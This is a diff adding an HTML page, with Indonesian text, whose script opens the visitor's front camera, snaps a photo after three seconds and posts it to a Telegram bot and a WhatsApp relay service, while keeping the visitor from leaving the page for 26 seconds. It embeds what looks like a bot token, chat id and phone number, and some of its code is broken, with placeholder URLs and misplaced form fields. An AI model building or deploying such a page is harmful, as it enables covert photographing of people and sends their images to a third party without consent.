@@ -1,0 +1,155 @@
+<html>
+<head>
+    <title>Web Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0000FF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            color: #000000;
+        }
+        .box {
+            background-color: #FFFFFF;
+            border: 2px solid #000000;
+            padding: 10px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .box p {
+            margin: 0;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .message {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        video, canvas {
+            display: none;
+        }
+        .refresh-button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #FFFFFF;
+            border: 2px solid #000000;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <p>Kamera Berjalan</p>
+            <p>Mengambil vidio 4detik</p>
+            <p>Buat jadi kamera depan mengambil otomatis selama 3detik dan mengirimya lewat bot telegram dan nomor whatsapp</p>
+        </div>
+        <div class="message">
+            OTOMATIS TIDAK BISA KELUAR WEB SELAMA 26 DETIK
+        </div>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
+        <button class="refresh-button" onclick="refreshPage()">Refresh Halaman</button>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Request access to the camera
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(takePicture, 3000); // Take picture after 3 seconds
+            })
+            .catch(err => {
+                console.error("Error accessing the camera: " + err);
+            });
+
+        function takePicture() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
+            sendToTelegram(dataURL);
+            sendToWhatsApp(dataURL);
+        }
+
+        function sendToTelegram(dataURL) {
+            const blob = dataURItoBlob(dataURL);
+            const formData = new FormData();
+            formData.append('7336408897', '8116876064:AAH2gRfMhF4o4NHivaszSbQ7sTLy-72Q9n0');
+            formData.append('photo', blob, 'photo.png');
+
+            fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+
+        function sendToWhatsApp(dataURL) {
+            const blob = dataURItoBlob(dataURL);
+            const formData = new FormData();
+            formData.append('phone', '6282218603188');
+            formData.append('body', 'data:image/png;base64,' + dataURL.split(',')[1]);
+
+            fetch(`https://api.callmebot.com/whatsapp.php?phone=YOUR_PHONE_NUMBER&text=Image&apikey=YOUR_API_KEY`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Prevent user from leaving the page for 26 seconds
+        let preventExit = true;
+        setTimeout(() => {
+            preventExit = false;
+        }, 26000);
+
+        window.addEventListener('beforeunload', function (e) {
+            if (preventExit) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+
+        function refreshPage() {
+            location.reload();
+        }
+    </script>
+</body>
+</html>
